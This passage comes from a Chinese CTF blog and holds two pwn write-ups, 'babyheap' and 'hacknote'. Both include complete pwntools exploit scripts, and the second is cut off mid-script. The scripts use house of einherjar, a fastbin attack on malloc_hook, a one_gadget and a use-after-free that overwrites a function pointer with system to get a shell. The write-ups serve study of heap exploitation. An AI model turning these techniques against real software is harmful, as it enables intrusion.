<h4 id="execve执行情况如下"><a href="#execve执行情况如下" class="headerlink" title="execve执行情况如下"></a>execve执行情况如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7fe7cb15715d &lt;exec_comm+2285&gt;    call   execve &lt;0x7fe7cb132770&gt;</span><br><span class="line">path: 0x7fe7cb1f2d57 ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;</span><br><span class="line">argv: 0x7ffe640ad200 ◂— 0x0</span><br><span class="line">envp: 0x7ffe640ad2c8 —▸ 0x7ffe640adfaf ◂— &#39;LD_PRELOAD&#x3D;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br></pre></td></tr></table></figure>

<h4 id="payload构造如下"><a href="#payload构造如下" class="headerlink" title="payload构造如下"></a>payload构造如下</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#modify malloc_hook</span></span><br><span class="line">realloc_addr = libc_base + lib.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">li(<span class="string">&#x27;realloc_addr &#x27;</span> +  <span class="built_in">hex</span>(realloc_addr))</span><br><span class="line">gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget = libc_base + gadget[<span class="number">3</span>]</span><br><span class="line">p = <span class="string">&#x27;\x11&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>)</span><br><span class="line">p += p64(one_gadget) <span class="comment"># realloc_hook</span></span><br><span class="line"><span class="comment">#mallok_hook then call realloc for banance stackthen call one_gadget</span></span><br><span class="line">p += p64(realloc_addr + <span class="number">20</span>) <span class="comment"># malloc_hook</span></span><br><span class="line">p += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">ad(<span class="number">0x68</span>, p)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;timu&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">libFile  = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">pd32  = <span class="keyword">lambda</span> x : p32(x).decode() <span class="comment">#python3 not surport str + bytes</span></span><br><span class="line">pd64  = <span class="keyword">lambda</span> x : p64(x).decode()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(x)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Data:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice :&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#def q():</span></span><br><span class="line"><span class="comment">#	sla(&#x27;:&#x27;, str(5))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	ad(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># idx 0</span></span><br><span class="line">	ad(<span class="number">0x80</span>, <span class="string">&#x27;B&#x27;</span> * <span class="number">0x80</span>) <span class="comment"># idx 1</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;C&#x27;</span> * <span class="number">0x68</span>) <span class="comment"># idx 2</span></span><br><span class="line">	ad(<span class="number">0xF0</span>, <span class="string">&#x27;E\n&#x27;</span>)      <span class="comment"># idx 3</span></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;F\n&#x27;</span>) <span class="comment">#for avoid merge to top chunk</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	<span class="comment"># use house of einherjar</span></span><br><span class="line">	p = <span class="string">&#x27;C&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">	p += p64(<span class="number">0x190</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>, p)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">2</span>) <span class="comment">#for fastbin attack, now make it in fastbin</span></span><br><span class="line">	<span class="comment"># trigger house of eiherjar</span></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line">	<span class="comment"># leak main_arena</span></span><br><span class="line">	ad(<span class="number">0x80</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">16</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	dp()</span><br><span class="line">	main_arena = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="number">0x58</span></span><br><span class="line">	libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">	li(<span class="string">&#x27;main_arena &#x27;</span> + <span class="built_in">hex</span>(main_arena))</span><br><span class="line">	li(<span class="string">&#x27;libc_base &#x27;</span> +  <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	<span class="comment"># fastbin attack to malloc_hook - 0x23</span></span><br><span class="line">	p = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x80</span></span><br><span class="line">	p += p64(<span class="number">0</span>)</span><br><span class="line">	p += p64(<span class="number">0x71</span>)</span><br><span class="line">	p += p64(main_arena - <span class="number">0x33</span>)</span><br><span class="line">	p += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">	ad(<span class="number">0xA0</span>, p)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x68</span>, <span class="string">&#x27;\n&#x27;</span>) <span class="comment">#for ajust fastbin</span></span><br><span class="line">	<span class="comment">#modify malloc_hook</span></span><br><span class="line">	realloc_addr = libc_base + lib.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;realloc_addr &#x27;</span> +  <span class="built_in">hex</span>(realloc_addr))</span><br><span class="line">	gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">	one_gadget = libc_base + gadget[<span class="number">3</span>]</span><br><span class="line">	p = <span class="string">&#x27;\x11&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>)</span><br><span class="line">	p += p64(one_gadget)</span><br><span class="line">	<span class="comment">#mallok_hook then call realloc for banance stackthen call one_gadget</span></span><br><span class="line"></span><br><span class="line">	p += p64(realloc_addr + <span class="number">20</span>)</span><br><span class="line">	p += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">	ad(<span class="number">0x68</span>, p)</span><br><span class="line">	<span class="comment"># get shell</span></span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line">			io = exe.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = exe.process()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		exe = ELF(exeFile)</span><br><span class="line">		io = remote(remoteIp, remotePort)</span><br><span class="line">		<span class="keyword">if</span> LIB:</span><br><span class="line">			lib = ELF(libFile)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/04/14/wp-babyheap/" data-id="ckhemv822002mwdcm2agzhpjo" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-hacknote" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/08/wp-hacknote/" class="article-date">
  <time datetime="2020-04-08T13:23:10.000Z" itemprop="datePublished">2020-04-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/08/wp-hacknote/">wp hacknote</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>World of Attack &amp; Defense</p>
<h2 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h2><p>4 / 10</p>
<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><p>相对比较简单的堆利用题目, 保护机制比较少,涉及知识点也比较少…</p>
<h2 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">rm</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]); <span class="comment">//释放后没有让指针数组清空</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);                            <span class="comment">// not set null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">//打印函数</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">puts_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )</span><br><span class="line">     <span class="comment">//vul 可以在堆中修改实现控制eip</span></span><br><span class="line">    (*(<span class="keyword">void</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1])(ptr[v1]); <span class="comment">//若没释放会调用 addputs函数</span></span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">addputs</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>堆的基本利用</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>使用UAF漏洞实现和在堆中调用指针函数漏洞来实现获取libc基址,获取system地址,再次使用UAF修改该指针打印调用system获得shell</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="获取libc基址"><a href="#获取libc基址" class="headerlink" title="获取libc基址"></a>获取libc基址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ad(<span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">ad(<span class="number">0x10</span>, <span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">dump_addr = <span class="number">0x0804862B</span></span><br><span class="line">ad(<span class="number">0x8</span>, p32(dump_addr) + p32(exe.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">dp(<span class="number">0</span>)</span><br><span class="line">puts_addr = u32(r(<span class="number">4</span>))</span><br><span class="line">li(<span class="string">&#x27;puts_addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>通过修改函数指针为system获得shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get shell</span></span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">ad(<span class="number">0x8</span>, p32(sys_addr) + <span class="string">&#x27;; sh&#x27;</span>)</span><br><span class="line">dp(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>





<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"><span class="comment"># Team  : D0g3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="comment">#context.terminal = &#x27;konsole&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">exeFile  = <span class="string">&quot;hacknote&quot;</span></span><br><span class="line">libFile  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span 